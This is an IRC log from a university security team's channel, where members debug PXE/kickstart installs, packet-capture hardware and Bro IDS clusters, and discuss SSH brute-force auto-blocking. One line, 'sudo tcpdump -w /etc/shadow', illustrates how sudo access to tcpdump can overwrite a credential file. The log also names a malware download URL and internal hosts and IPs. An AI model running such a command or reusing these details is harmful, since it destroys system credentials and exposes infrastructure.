2014-08-25 14:44:42	soehlert	i'll give the other one a shot though
2014-08-25 14:44:51	soehlert	which machines was it again?
2014-08-25 15:25:59	eyrich	tepid and cool are showing not runnin - and when I checked on tepid it was status stopped
2014-08-25 15:26:01	eyrich	i started it
2014-08-25 15:26:11	soehlert	Started it how?
2014-08-25 15:26:28	eyrich	status started on the machine - but not in esx
2014-08-25 15:26:39	soehlert	wait what?
2014-08-25 15:26:59	eyrich	[root@tepid init]# status vmware-tools
2014-08-25 15:27:01	eyrich	vmware-tools start/running
2014-08-25 15:27:14	soehlert	you typed status vmware-tools and that started it?
2014-08-25 15:27:24	soehlert	or you are saying it was started, but esx doesn't see it?
2014-08-25 15:27:33	eyrich	no - 
2014-08-25 15:27:35	eyrich	[root@tepid init]# status vmware-tools
2014-08-25 15:27:35	eyrich	vmware-tools stop/waiting
2014-08-25 15:27:35	eyrich	[root@tepid init]# start vmware-tools
2014-08-25 15:27:35	eyrich	vmware-tools start/running
2014-08-25 15:27:43	soehlert	gotcha
2014-08-25 15:27:43	eyrich	yes started but esx not reporting that it is running
2014-08-25 16:17:45	jschipp	have the nagios check written for that but it's not in production yet because puppet isn't working a few machines e.g. tepid, warm, cool
2014-08-25 16:18:03	jschipp	so it won't get the latest NRPE checks
2014-08-25 16:19:02	soehlert	Fucking comcast chat is the worst: "It will end your discounted rate after next or the other month since the account availed
2014-08-26 11:47:40	jazoff	you see the TeamCymruMalwareHashRegistry::Match alert from before
2014-08-26 11:47:46	jazoff	File Description: http://www.searchapps.me/download/Adobe_Flash_Player.exe
2014-08-26 11:47:54	jazoff	orig/src hostname: eyoung-win7.ncsa.illinois.edu
2014-08-26 11:53:10	soehlert	did not. im mostly ignoring the real world today. over at npcf converting machines today. anyone using subzero?
2014-08-26 11:53:37	jazoff	i'm logged in but not really using
2014-08-26 11:54:35	soehlert	as long as youre not actively pcaping then im gonna blow it away
2014-08-26 11:56:36	wardog	"Say ehlo to my little friend"...
2014-08-26 11:58:56	jazoff	ah.. so about that host that didnt get bhrd
2014-08-26 11:59:06	jazoff	it was only setting off the SSH::Password_Guessing notice which isn't set to auto block
2014-08-26 11:59:20	jazoff	the varition of it that I wrote called SSH::Bad_Client_Password_Guessing is the one that auto blocks
2014-08-26 12:00:01	jazoff	that requires a ssh version of libssh so as to reduce false positives
2014-08-26 12:00:25	jazoff	enabling auto blocking for SSH::Password_Guessing could be risky, but maybe it will be ok with a high enough threshold
2014-08-26 12:01:34	jazoff	and it looks like SSH::Subnet_Scanner didn't trigger because they were only scanning 2 subjest
2014-08-26 12:01:37	jazoff	subnets
2014-08-26 12:02:09	wardog	What about ossec? Shouldn't ossec block on bad ssh guesses?
2014-08-26 12:02:29	wardog	er, X failures is Y minutes?
2014-08-26 12:02:51	soehlert	it does if the host is forwarding us logs
2014-08-26 12:03:15	jazoff	ah yaeh, that was also why I did not want to be too aggrssive with ssh
2014-08-26 12:03:35	jazoff	i think the ones I looked at in the past that bro was not auto blocking, ossec was
2014-08-26 12:03:38	wardog	I'm guessing cosmology doesn't send to us.
2014-08-26 12:04:31	wardog	What's the difference between SSH::Password_Guessing and SSH::Bad_Client_Password_Guessing?
2014-08-26 12:04:32	jazoff	that scan was interesting
2014-08-26 12:04:49	jazoff	the bad client one only triggers when the ssh client includes libssh
2014-08-26 12:04:49	wardog	oh
2014-08-26 12:04:52	wardog	right...
2014-08-26 12:04:57	wardog	youd said that.
2014-08-26 12:05:12	jazoff	yeah, I think there are a lot of fps with SSH::Password_Guessing
2014-08-26 12:05:24	jazoff	but I also ported over a script I wrote at UA called subnet scanners
2014-08-26 12:05:37	jazoff	so, you could scan 141.142.1.x all you wanted
2014-08-26 12:05:55	jazoff	but if you scanned 1.x 2.x 3.x 4.x you are a "subnet scanner" and you get blocked
2014-08-26 12:06:31	jazoff	218.80.224.45 was odd though
2014-08-26 12:06:42	jazoff	on the 25th, it only scanned 911 141.142.227.42 954 141.142.227.73 1797 141.142.236.132 1824 141.142.237.125 2624 141.142.237.121 2629 141.142.236.142
2014-08-26 12:07:31	jazoff	maybe what I can do is make a version of SSH::Password_Guessing that ignores US connections
2014-08-26 12:07:49	jazoff	basically concerned that some sciency thing will spawn a ton of ssh connections and get blocked
2014-08-26 12:08:10	wardog	If I'm not mistaken, I think that IP was already in SES.
2014-08-26 12:08:35	soehlert	ehhh we have a lot of sciency people overseas too..
2014-08-26 12:08:56	jazoff	yeah, better integration with ses is one of my top things to do
2014-08-26 12:08:57	soehlert	the big one i can think of is that telescope for lsst down in Peru(?)
2014-08-26 12:09:10	jazoff	we may not want to preemptivey block stuff that is in ses
2014-08-26 12:09:26	jazoff	but maybe load it up and auto block any ssh failure where the src ip is in ses
2014-08-26 12:11:39	jazoff	see in splunk:
2014-08-26 12:11:42	jazoff	"SSH::Password_Guessing" | top limit=100 src | geoip src
2014-08-26 12:12:09	jazoff	#2 is n2003.lbl.gov. that set it off 47 times in the last week
2014-08-26 12:13:38	jazoff	so yeah.. very harrd to autoblock individual src->dst ssh connections in bro
2014-08-26 12:14:08	jazoff	vlad is working on a better ssh analyzer that might have more accurate diferentiation between short succesful connections and failures
2014-08-26 12:16:53	soehlert	ya linking it up with SES makes sense to me
2014-08-26 12:17:40	jazoff	ok, so it should be a short script..
2014-08-26 12:17:56	jazoff	handle ssh login failure event, see if it is in ses, then raise new notice
2014-08-26 12:19:26	soehlert	ya and we can run that as just an alert for a while and see how it handles, then if it seems to have no false positives we can push it to the bhr
2014-08-26 12:21:44	jazoff	though 218.80.224.45 is not in any of the intel logs
2014-08-26 12:22:28	soehlert	jazoff: arista is about to be unplugged.
2014-08-26 12:22:33	jazoff	there are others that are though
2014-08-26 12:22:34	jazoff	booo
2014-08-26 12:22:45	jazoff	is it coming back? 
2014-08-26 12:22:45	soehlert	indeed
2014-08-26 12:22:48	jazoff	oh
2014-08-26 12:22:51	jazoff	i thought we had to send it back
2014-08-26 12:22:54	soehlert	the indeed was to the boo
2014-08-26 12:22:59	soehlert	its not coming back
2014-08-26 12:23:02	jazoff	boo
2014-08-26 12:32:30	jazoff	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/96.43.97.252
2014-08-26 12:32:45	jazoff	lots of the things setting off the intel notices are already getting blocked
2014-08-26 12:33:09	jazoff	seems like if they had been doing something nasty enough to get themselves in an intel feed we would block them for the same reason
2014-08-26 12:33:33	soehlert	jesus intel notices like crazy
2014-08-26 12:33:40	jazoff	the ip scanning cosmology wasn't scanning, it was just trying really hard to login to a few servers
2014-08-26 12:33:50	jazoff	er, ip hitting cosmology :)
2014-08-26 12:34:02	soehlert	ya thats where ossec is helpful, but im not sure they are giving us logs
2014-08-26 12:34:49	jazoff	yeah, until bro has a better analyzer i think ossec is the safest bet
2014-08-26 12:35:03	jazoff	since currently 'ssh hostname uptime' will look like a failure
2014-08-26 12:41:32	wardog	Ok, well, first check to see if their system is sending us syslog. Second, can someone respond to them metioning that it was a unique scan that was able to bypass our detection due to the nature of SSH and if they aren't sending us syslog, that they should so we can supplement the scans with alerts from the host directly.
2014-08-26 12:41:43	wardog	I would, but Randy's talking and I'm on deck.
2014-08-26 13:00:16	jschipp	I will
2014-08-26 13:02:05	jschipp	no logs from hostname cosmo* on seclogs
2014-08-26 13:22:35	eyrich	soehlert: where do I find the DHCP config for the prc net?
2014-08-26 13:23:11	eyrich	PRV net
2014-08-26 13:25:40	soehlert	on kickstart-sec in /etc/dhcpd.conf
2014-08-26 13:29:06	eyrich	are there a couple IPs you prefer I assign to  DHCP on the public side
2014-08-26 13:30:02	eyrich	86-87?
2014-08-26 13:31:04	soehlert	those work
2014-08-26 13:38:32	eyrich	kickstart-sec has a public IP address, is the tftp server open on that port?
2014-08-26 13:40:53	soehlert	it's bound to 0.0.0.0
2014-08-26 13:40:57	soehlert	so yse
2014-08-26 13:41:10	eyrich	what about iptables rules
2014-08-26 13:42:54	soehlert	one sec gotta make a rule for that
2014-08-26 13:45:01	soehlert	ah hell its still talking to the old puppet master. gonna need a few
2014-08-26 13:56:08	wardog	Did someone make an incident folder for the NTP stuff that happened recently?
2014-08-26 13:56:16	wardog	Networking devices I think?
2014-08-26 13:56:31	wardog	I think it happened during BroCon?
2014-08-26 14:00:02	eyrich	folder?
2014-08-26 14:05:31	soehlert	oooook eyrich think i got it. are you suggesting i should be good to go now?
2014-08-26 14:07:33	eyrich	try booting and see what happens
2014-08-26 14:07:44	eyrich	I might need to play around with a fw rule allowing DHCP
2014-08-26 14:13:34	jazoff	wardog: oh, hmm
2014-08-26 14:13:51	jazoff	no, I forgot to go back and do that
2014-08-26 14:14:00	jazoff	I can get that done this week
2014-08-26 14:14:25	jazoff	might be fried tomorrow though
2014-08-26 14:16:35	soehlert	looks good as of now eyrich 
2014-08-26 14:17:41	soehlert	i had melliot send us the notice they got from RSA since we were asked if we knew anything about it. anyone wanna explain to jenos? i can later if not, laptop about to die
2014-08-26 14:18:28	eyrich	what not have a manager point jenos to ITS  - we dont run the server why should we explain?
2014-08-26 14:19:30	soehlert	security vuln i guess. idk dindt really read his email 
2014-08-26 14:19:55	soehlert	also, weirdly networkmanager can't get an address during the actual kickstart
2014-08-26 14:20:04	soehlert	but it must have one to get into the kickstart right?
2014-08-26 14:25:20	eyrich	yes it got an IP
2014-08-26 14:25:24	eyrich	to kick start
2014-08-26 14:25:57	eyrich	i see the lease on the server
2014-08-26 14:26:25	eyrich	so does this mean its not going to work? or can you manually assign the proper static?
2014-08-26 15:01:14	soehlert	i can manually assign but im having issues with grabbing the default kickstart. i think its on my side though
2014-08-26 15:04:25	soehlert	maybe not. not seeing any traffic hitting kickstart-sec and it shows failed to connect to server in the stderr
2014-08-26 15:04:38	soehlert	curling the default kickstart from another public only host works just fine though
2014-08-26 15:07:10	eyrich	There is no network FW between a public IP host and the kickstart box, just host iptables, which you opened up 
2014-08-26 15:07:29	eyrich	with your test are you curling from the public IP or private?
2014-08-26 15:09:40	soehlert	right and i was curling the public ip
2014-08-26 15:09:40	soehlert	i was hoping there was a way we could check and make sure the ip i manually assigned is working, but i cant think of how
2014-08-26 15:10:54	eyrich	what IP did you assign?
2014-08-26 15:11:54	soehlert	the same one subzero had before. 141.142.148.41
2014-08-26 15:13:18	eyrich	so you opened up tcp:80 and udp:69 on the public side?
2014-08-26 15:15:03	soehlert	yes
2014-08-26 15:15:26	soehlert	its http that's having issues, but on a host with only a public ip i curled 141.142.148.72/path/to/file
2014-08-26 15:15:41	soehlert	and it worked
2014-08-26 15:15:41	soehlert	so its not a fw gotta be something wrong with the networking on this kickstarting host
2014-08-26 15:16:33	eyrich	does it require DNS at all? what did you manually assign when you assigned 141.142.148.41/25 ?
2014-08-26 15:16:40	eyrich	and what GW?
2014-08-26 15:18:47	soehlert	i manually assigned 141.142.148.41/25 gw 141.142.148.1 and dns 141.142.2.2
2014-08-26 15:19:01	eyrich	all good
2014-08-26 15:19:56	soehlert	and i just tried doing 141.142.148.41/255.255.255.128 in case it liked that betters
2014-08-26 15:20:00	soehlert	same thing
2014-08-26 15:21:12	eyrich	from the host can you ping stuff? GW, DNS, kickstart server ?
2014-08-26 15:21:38	soehlert	i dont have access to a cli which is why idk how to test this
2014-08-26 15:21:54	soehlert	i can create one in the kickstart but that doesnt help since i cant get it
2014-08-26 15:22:10	eyrich	how did you set the network stuff then?
2014-08-26 15:22:21	soehlert	there's a dialog menu that asks for the details
2014-08-26 15:22:26	soehlert	its just part of the pxeboot
2014-08-26 15:22:54	eyrich	do you know it is trying to pull the https stuf from the public IP?
2014-08-26 15:23:13	soehlert	yes because it fails at first since it defaults to the private, but then i change it manually to point to the right one
2014-08-26 15:23:14	eyrich	maybe its hard coded to go to the private IP on the KS server 
2014-08-26 15:23:21	eyrich	oh
2014-08-26 15:25:30	soehlert	pinging .41 doesn't work but im not sure if it should at this point in time
2014-08-26 15:27:24	soehlert	hmm its dual homed so im gonna unplug the second one and see if that helps me figure this out
2014-08-26 15:29:57	soehlert	i see its grabbing .86 during pxe and then launching anaconda
2014-08-26 15:31:07	soehlert	ok using dhcp in anaconda fails
2014-08-26 15:32:02	eyrich	i think it should be pingable during the welcome to centos
2014-08-26 15:32:13	soehlert	its not the welcome to centos part
2014-08-26 15:32:13	soehlert	thats after its been installed
2014-08-26 15:32:20	soehlert	this is stuck in anaconda
2014-08-26 15:32:35	soehlert	ie between pxeboot and kickstart
2014-08-26 15:32:51	soehlert	the dhcp address it was given is not pingable now either
2014-08-26 15:32:55	eyrich	when do you see welcome to centos?
2014-08-26 15:33:09	eyrich	what step, Im testing on a vm
2014-08-26 15:33:15	eyrich	i have .87
2014-08-26 15:33:45	eyrich	.83 responds to pings but not on wiki
2014-08-26 15:34:25	soehlert	thats because we dont use the wiki anymore for that
2014-08-26 15:34:31	soehlert	ip info is in git
2014-08-26 15:35:05	eyrich	eff that
2014-08-26 15:35:37	eyrich	then someone needs to up date the wiki pages and remove the info from them
2014-08-26 15:35:47	soehlert	83 is puppet-sec
2014-08-26 15:35:47	soehlert	im geting to that but its not a high priority
2014-08-26 15:36:07	soehlert	can you check the network that port 8 on switch in rack 1 please? just want to make sure it's what we expect
2014-08-26 15:38:06	soehlert	welcome to centos is in the top corner fo the anaconda thing
2014-08-26 15:38:06	soehlert	i didnt realize till now.
2014-08-26 15:38:25	soehlert	.86 not pingable for me 
2014-08-26 15:38:48	eyrich	that port is on vlan 1773 - which is public
2014-08-26 15:39:11	soehlert	ok so thats at least expected
2014-08-26 15:39:30	eyrich	right - especially since you did get a DHCP 
2014-08-26 15:40:23	eyrich	I just got the time out the second time, changed the address from 10. to 141. and it worked
2014-08-26 15:40:35	eyrich	it pulled the img file
2014-08-26 15:40:51	soehlert	as you should, but the same thing fails for me
2014-08-26 15:40:51	soehlert	is there a way to check that the switch is seeing packets come in by any chance?
2014-08-26 15:41:25	eyrich	make sure you only have one interface up, and instead of assigning an ip tell it to use dhcp
2014-08-26 15:41:48	soehlert	i did that and it never got one in anaconda
2014-08-26 15:42:02	eyrich	and if this is box is dual homed why are we messing with public IP side kick start?
2014-08-26 15:42:17	soehlert	well ifconfig just showed one so i thought it wasnt
2014-08-26 15:42:33	soehlert	but we'd need to move the internal to the first port anyways. kickstart can be picky about that
2014-08-26 15:43:05	eyrich	thats what I'm guessing is going on - anoconda is trying to use wrong eth
2014-08-26 15:43:12	soehlert	but theres only one plugged in
2014-08-26 15:43:23	soehlert	i rebooted after unplugging the second one
2014-08-26 15:43:43	eyrich	how about rebooting with only the second one plugged in?
2014-08-26 15:43:49	eyrich	I need to free up dhcp leases too
2014-08-26 15:44:10	eyrich	from git can you tell me if we have a 4 or more block on IPs free
2014-08-26 15:45:03	soehlert	84-87 are open (if you reuse the two you already were using for this)
2014-08-26 15:45:12	eyrich	ok
2014-08-26 15:45:44	eyrich	done, go ahead and boot up with only the other nic conencted
2014-08-26 15:50:48	soehlert	damn i think the second nic is messed up. media test failure with multiple cables
2014-08-26 15:52:37	soehlert	wait thats weird. no link light on the switch side
2014-08-26 15:54:00	eyrich	i would throw out that cable and get a manufactured one - just to be safe
2014-08-26 15:54:09	eyrich	what port on the switch side
2014-08-26 15:54:42	soehlert	it is a manufactured one
2014-08-26 15:54:42	soehlert	hang on it might have just not been seated properly
2014-08-26 15:55:12	soehlert	ok i get link lights now, but still media test failure in pxe
2014-08-26 15:56:01	eyrich	ok pxe wants to boot the other nic
2014-08-26 15:56:10	soehlert	apparently pxe is expecting it in the first port only. same cord plugged into the first port getspast that
2014-08-26 15:56:35	eyrich	ya i was going to suggest that
2014-08-26 15:56:46	soehlert	not getting a dhcp address
2014-08-26 15:56:46	soehlert	can you check port 7 on the switch?
2014-08-26 15:57:03	eyrich	vlan 1781
2014-08-26 15:57:07	eyrich	on "bro host for campus direct peering";
2014-08-26 15:57:16	soehlert	oh hell thats why no dhcp..
2014-08-26 15:57:30	soehlert	i figured it was an internal port but its a totally different net we dont use
2014-08-26 15:57:46	eyrich	so it should be disabled and not connected
2014-08-26 15:58:38	soehlert	yup
2014-08-26 15:58:38	soehlert	can you change it to private net please?
2014-08-26 15:58:57	eyrich	wait you want this host to be dual?
2014-08-26 15:59:57	soehlert	no i suppose not, you can just shut down port 7 for now i'll plug port 8 back into eth0 and try again
2014-08-26 16:00:29	eyrich	i changed it any way - better to be on at least a net we might use
2014-08-26 16:01:37	soehlert	sounds good.
2014-08-26 16:01:37	soehlert	alright so cable im using is good as is the nic since this can get a public dhcp address.
2014-08-26 16:01:40	soehlert	we know this much
2014-08-26 16:12:33	eyrich	you need anything else from me?
2014-08-26 16:13:23	soehlert	i guess not you've proven it can work.
2014-08-26 16:14:22	eyrich	ok, plus you have port 7 if you want to just switch to private and then move it back
2014-08-26 16:14:42	soehlert	ya
2014-08-27 09:25:26	soehlert	not feeling good at all today, taking a sick day
2014-08-27 09:26:07	jazoff	i'm kind of useless today too
2014-08-27 09:26:40	jazoff	monday was brutal, took 12 hours to get from IL to DC
2014-08-27 09:27:02	jazoff	few hours of sleep and then bro stuff all day and then fly back to ATL
2014-08-27 09:28:49	wardog	me too and I'm stuck in a fricken refridgerator of a conference room. I should have booked today to fly back.
2014-08-27 10:31:28	eyrich	how do I access the git repositories for the security data that has been moved from the wiki?
2014-08-27 10:31:57	eyrich	do we have a wiki page on this some where?
2014-08-27 10:38:27	jazoff	clone git@git-sec.internal.ncsa.edu:ncsa-security/secops.git
2014-08-27 10:39:30	jazoff	or just go to https://git-sec.internal.ncsa.edu/ncsa-security/secops/tree/master
2014-08-27 10:44:12	wardog	Git-sec is only available from the 10.142 net, right? So, tunneled through fog if you're not.
2014-08-27 10:45:28	eyrich	and what was the point of moving IP allocations and other stuff hosted on the wiki to git?
2014-08-27 10:46:30	eyrich	I would like to be able to get to git-sec from sects01 - the network FW already allows please adjust host rules
2014-08-27 10:50:56	jazoff	ok, changed stuff in puppet, that should do it 
2014-08-27 10:50:58	jazoff	next time puppet runs
2014-08-27 10:54:28	eyrich	what credentials ?
2014-08-27 10:55:36	jazoff	they are local..
2014-08-27 10:56:02	eyrich	why?
2014-08-27 10:56:12	eyrich	we have ncsa kerb and AD we can use
2014-08-27 10:56:20	jazoff	ask schipp.. :)
2014-08-27 10:56:24	eyrich	any way - i dont have records of being assigned a u/p
2014-08-27 10:57:17	jazoff	hmm, you have an account
2014-08-27 10:57:49	eyrich	ok i did password reset
2014-08-27 10:59:28	eyrich	no email yes
2014-08-27 10:59:30	eyrich	yet
2014-08-27 11:01:01	jazoff	hmm, I can't login to git-sec apparently
2014-08-27 11:04:42	eyrich	im going to lunch - never did get an email for reset
2014-08-27 14:57:24	eyrich	jazoff: can you see if 3rd cluster is seeing traffic
2014-08-27 15:01:17	jazoff	ok
2014-08-27 15:01:55	jazoff	does not look like it
2014-08-27 15:03:46	ncsabot	test
2014-08-27 15:04:21	jazoff	ok, as soon as the box sees packets on eth0 it should send something here
2014-08-27 15:59:16	eyrich	i might have connected to eth 1, can you check that one
2014-08-27 16:07:38	ncsabot	drought receiving packets on eth0
2014-08-27 16:07:44	jazoff	er, disregard that
2014-08-27 16:09:12	jazoff	looks like it is a single port card
2014-08-27 16:33:07	jazoff	is bro-dev getting 100% of the traffic?
2014-08-27 20:19:56	--	irc: disconnected from server
2014-08-27 20:20:07	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-08-27 20:20:07	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-08-27 20:20:19	--	Mode #security [+]
2014-08-27 20:20:19	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-08-28 07:42:21	eyrich	there are 2 cards
2014-08-28 07:43:02	eyrich	jazoff: dev should be getting 100%
2014-08-28 07:48:37	jazoff	so, prod and dev have different rates
2014-08-28 07:48:45	jazoff	I thought that was mostly due to dumbno filtering, but that wouldn't be it 
2014-08-28 07:48:52	eyrich	no
2014-08-28 07:49:02	eyrich	oh i see, hmm
2014-08-28 07:49:13	jazoff	based on the graphs (that are broken up by worker)
2014-08-28 07:49:19	jazoff	http://munin-sec.internal.ncsa.edu/munin/static/dynazoom.html?cgiurl_graph=/munin-cgi/munin-cgi-graph&plugin_name=broprod/Aggregated/myri_bits&size_x=800&size_y=400&start_epoch=1408538795&stop_epoch=1409229995
2014-08-28 07:49:23	jazoff	er
2014-08-28 07:49:29	eyrich	only though would be packets getting dropped because we over going over 10Gb on a link to a dec member?
2014-08-28 07:49:33	jazoff	and
2014-08-28 07:49:33	jazoff	http://munin-sec.internal.ncsa.edu/munin/static/dynazoom.html?cgiurl_graph=/munin-cgi/munin-cgi-graph&plugin_name=brodev/AggregatedNewDev/bps&size_x=800&size_y=400&start_epoch=1408538794&stop_epoch=1409229994
2014-08-28 07:49:39	jazoff	nowhere near 10g
2014-08-28 07:50:38	jazoff	so.. some of the color bars match up exactly
2014-08-28 07:51:29	eyrich	it would have been broken from tuesday 1pm to yesterday aroudn 3
2014-08-28 07:51:32	eyrich	should be same after that
2014-08-28 07:51:49	jazoff	hmm, does look a little better now
2014-08-28 07:52:26	eyrich	dev was oly getting 1/2 until I reconfigured yesterday afternoon
2014-08-28 07:52:27	jazoff	though it looks like it was always like that
2014-08-28 07:52:51	eyrich	maybe the intels arent doing as well as we thought
2014-08-28 07:53:05	jazoff	i don't think that was it
2014-08-28 07:53:19	jazoff	looks like dev just wasn't getting what was sent to nids-26 - 29
2014-08-28 07:53:46	jazoff	just nids-22 - 25 were getting most of the traffic so it wasn't as noticable
2014-08-28 07:54:21	jazoff	open
2014-08-28 07:54:22	jazoff	http://munin-sec.internal.ncsa.edu/munin/static/dynazoom.html?cgiurl_graph=/munin-cgi/munin-cgi-graph&plugin_name=broprod/Aggregated/myri_bits&size_x=800&size_y=400&start_epoch=1406378795&stop_epoch=1409229995
2014-08-28 07:54:26	jazoff	and
2014-08-28 07:54:26	jazoff	http://munin-sec.internal.ncsa.edu/munin/static/dynazoom.html?cgiurl_graph=/munin-cgi/munin-cgi-graph&plugin_name=brodev/AggregatedNewDev/bps&size_x=800&size_y=400&start_epoch=1406378794&stop_epoch=1409229994
2014-08-28 07:55:08	jazoff	and flip between them.  the green+blue+orange+yellow are just about the same on both graphs
2014-08-28 07:56:08	jazoff	but yeah, since yeterday afternoon it matches up much better
2014-08-28 08:12:21	eyrich	can you check on drought
2014-08-28 08:15:07	jazoff	nothing
2014-08-28 08:15:17	jazoff	so drought has 4 builting cards and 1 myricm card
2014-08-28 08:15:29	eyrich	ok
2014-08-28 08:15:41	eyrich	ok hold on a sec
2014-08-28 08:16:01	eyrich	now check
2014-08-28 08:16:07	jazoff	nothing
2014-08-28 08:16:19	eyrich	weird
2014-08-28 08:17:03	eyrich	the gigamon is showing an up port on 23& 24 which is where I conencted drought and pcap. just coundlt remember which one
2014-08-28 08:17:05	eyrich	to which
2014-08-28 08:17:10	eyrich	but now I have tried both
2014-08-28 08:17:45	jazoff	can you temporarily move one of the dev ports to drought
2014-08-28 08:17:51	jazoff	just to rule out a problem on drought
2014-08-28 08:17:56	jazoff	just for 5 seconds should do
2014-08-28 08:18:06	eyrich	what?
2014-08-28 08:18:17	jazoff	oh, you are not there are you ? :)
2014-08-28 08:18:23	eyrich	no
2014-08-28 08:18:28	jazoff	scratch that then :)
2014-08-28 08:18:44	eyrich	i may have to go there to double check what it is plugged into though
2014-08-28 08:41:43	jazoff	once that gets resolved we can change it over to centos
2014-08-28 08:42:21	jazoff	I manually blocked some SSH scanners..
2014-08-28 08:42:31	jazoff	I think all of them were hitting the cosmology stuff
2014-08-28 08:43:10	jazoff	so clearly, no syslog+narrow scan =  no bhr
2014-08-28 08:56:03	eyrich	and Im ok with that, people need to send us syslogs
2014-08-28 10:46:49	soehlert	eyrich: i'll be heading into NPCF shortly if you want me to switch anything around
2014-08-28 11:01:02	eyrich	ok
2014-08-28 11:01:47	 *	jazoff lunch 
2014-08-28 11:12:53	eyrich	soehlert: i need to know what gigamon port is running to drought and if there are more then 1 SFP+ nic on the machine
2014-08-28 11:20:25	soehlert	ok i'll check that out
2014-08-28 11:51:45	soehlert	slot 3 port 23 and yes tehre are two
2014-08-28 11:51:57	soehlert	want me to move it to the other one for testing eyrich?
2014-08-28 11:53:00	eyrich	yes please moves - somethig is not right as 2 do not show up in the OS
2014-08-28 11:53:10	eyrich	wait what port 23?
2014-08-28 11:53:34	soehlert	that's the port number on the gigamon
2014-08-28 11:53:45	eyrich	nevrmind - yes giga 23
2014-08-28 11:53:45	soehlert	bottom gigamon slot 3 port 23
2014-08-28 11:53:52	eyrich	ok
2014-08-28 11:54:03	eyrich	and their are 2 NICs on drought
2014-08-28 11:54:23	soehlert	yes i will switch it to the other
2014-08-28 11:54:48	eyrich	great
2014-08-28 11:55:05	soehlert	k switched
2014-08-28 11:55:16	eyrich	whats weird on drought is only one shows up
2014-08-28 11:55:18	eyrich	[eyrich@drought ~]$ lspci |grep MY
2014-08-28 11:55:18	eyrich	06:00.0 Ethernet controller: MYRICOM Inc. Myri-10G Dual-Protocol NIC (rev 01)
2014-08-28 11:55:38	soehlert	that does seem odd. do the other machines show two?
2014-08-28 11:55:47	eyrich	havent looked
2014-08-28 11:56:01	eyrich	thanks for switch
2014-08-28 11:56:17	eyrich	gotta a appt
2014-08-28 11:56:23	eyrich	latter
2014-08-28 11:57:54	soehlert	see ya
2014-08-28 11:58:50	jazoff	hmm
2014-08-28 11:59:14	soehlert	jazoff: how many machines are supposed to be in the cluster with drought?
2014-08-28 11:59:22	jazoff	just drought
2014-08-28 11:59:47	jazoff	reloaded the drivers, says the link is down
2014-08-28 11:59:52	soehlert	which /usr/local/bro-* is it?
2014-08-28 12:00:00	jazoff	/bro
2014-08-28 12:00:14	soehlert	ahhh ok
2014-08-28 12:00:27	jazoff	maybe it was ok before and the driver just needed to be reloaded
2014-08-28 12:00:31	soehlert	so then the three nids-boxes are running for no reason...i see
2014-08-28 12:00:41	soehlert	does it seem ok now? i also did just switch the sfp+
2014-08-28 12:00:47	jazoff	no
2014-08-28 12:00:53	jazoff	maybe it was right the first time
2014-08-28 12:02:29	soehlert	so switch it back?
2014-08-28 12:02:35	jazoff	yeah
2014-08-28 12:02:42	jazoff	i mean, that's where it was all along, right?
2014-08-28 12:03:24	soehlert	yup
2014-08-28 12:03:52	soehlert	ok switched back
2014-08-28 12:05:00	jazoff	nothing
2014-08-28 12:38:09	soehlert	looks like seclogs has a bad stick of ram
2014-08-28 12:38:09	 *	soehlert sighs
2014-08-28 12:42:20	jazoff	hmm
2014-08-28 12:42:43	jazoff	do we run memtest on new HW at all?
2014-08-28 12:45:29	soehlert	well this is not new hw, but i dont think we ever did no
2014-08-28 14:37:05	soehlert	jazoff: id like to work on tuesday and wednesday on converting the bro machiens over to centos. sound good to you?
2014-08-28 14:37:43	jazoff	yeah.. I want to get drought working again so we can test with that
2014-08-28 14:37:50	jazoff	i need to work out the myricom puppet stuff
2014-08-28 14:39:22	soehlert	you think today and tomorrow will be enough time to get it sorted?
2014-08-28 14:39:32	jazoff	which it?
2014-08-28 14:39:46	jazoff	and by bro machines, does that include bro-dev?
2014-08-28 14:39:52	soehlert	well both i guess. will it be enough to time to be ready for me to start transitioning boxes
2014-08-28 14:39:56	jazoff	bro-dev should be easy since they should be 100% puppet
2014-08-28 14:39:58	soehlert	yah i need to get everything over to centos
2014-08-28 14:40:03	soehlert	we can start with those then
2014-08-28 14:40:08	jazoff	ok
2014-08-29 10:00:25	soehlert	feeling pretty crappy again. think i tried to do too much too soon yesterday. i'm gonna rest up and then i'll probably do some work this afternoon from home
2014-08-29 10:43:57	wardog	yeah. I'm home as well coughing up a lung.
2014-08-29 10:46:00	jazoff	fun.. I'm not feeling too great either.   I think I accumulated some germs on one of those flights
2014-09-02 09:50:53	soehlert	jazoff: i'm catching up on email and small random tasks this morning, but this afternoon i'll head to pcf and we can start cracking on the bro machines conversion?
2014-09-02 09:54:04	wardog	I have mountain of email. In case I missed anything, does anyone need anything from me?
2014-09-02 09:56:13	soehlert	i dont
2014-09-02 09:59:48	jazoff	soehlert: welll did we ever get the capture port on drought working?
2014-09-02 10:00:02	jazoff	i suppose we could try converting one of the bro-dev worker nodes as a start
2014-09-02 10:04:04	soehlert	we can do drought later i guess. im not suwe how i can help with that, but i'll be there so we can work on that this afternoon too
2014-09-02 10:04:25	jazoff	need drought to work out the myricom driver puppet module before we can convert the prod cluster
2014-09-02 10:04:54	soehlert	gotcha. we can move the dev cluster and while they are installing we can figure out drought
2014-09-02 10:08:53	jazoff	ok
2014-09-02 10:09:03	jazoff	i don't expecect any problems on the workers
2014-09-02 11:37:30	soehlert	wardog: so that didn't take long. Alex says he needs to do tcpdumps. How can we get him root on subzero and subzero only
2014-09-02 11:37:46	soehlert	any ideas? or should i try and make tcpdump available to run by regular users on subzero
2014-09-02 11:38:29	wardog	hrm.
2014-09-02 11:38:41	wardog	good question.
2014-09-02 11:39:22	wardog	subzero is only accessible from fog, right?
2014-09-02 11:39:26	soehlert	ya
2014-09-02 11:39:55	wardog	Should be ok to have regular users be able to make tcpdump available to everyone on subzero.
2014-09-02 11:40:01	jazoff	you don't really need root to run tcpdump
2014-09-02 11:40:02	wardog	Since, it's just us anyway.
2014-09-02 11:40:13	jazoff	and letting one run tcpdump with sudo lets people do bad things
2014-09-02 11:40:18	jazoff	sudo tcpdump -w /etc/shadow .... :)
2014-09-02 11:40:42	soehlert	jazoff: do explain. don't  you need root to put a nic in promiscuous mode?
2014-09-02 11:40:42	soehlert	well he's basically on our team sort of so if we can't trust him not to do tthat, then we're screwed here
2014-09-02 11:40:59	soehlert	but least privilege and all he wont' need access to 95% of our machines
2014-09-02 11:41:18	jazoff	you can use setcap
